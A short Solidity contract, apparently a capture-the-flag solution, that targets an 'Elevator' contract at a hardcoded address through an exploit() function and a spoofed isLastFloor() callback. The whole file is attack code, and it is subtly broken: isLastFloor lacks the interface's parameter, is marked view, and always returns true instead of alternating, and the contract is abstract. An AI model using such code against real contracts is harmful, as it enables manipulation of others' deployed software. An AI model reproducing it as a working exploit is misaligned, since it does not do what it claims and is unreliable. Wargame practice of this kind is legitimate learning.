pragma solidity ^0.8.9;

interface IBuilding {
  function isLastFloor(uint) external returns (bool);
}

interface IElevator {
  function goTo(uint) external;
}


abstract contract Building {

  address targetAddress = 0xe18e343288f56C2cBc41F4FFD289dE7C35498Da8;
  IElevator targetContract;
  constructor() {
    targetContract = IElevator(targetAddress);
  }

  function isLastFloor() view public returns (bool result) {
    if (result == true) {
      result = false;
    } else {
      result = true;
    }
    return result;
  }

  function exploit() public {
    targetContract.goTo(20);
  }
}
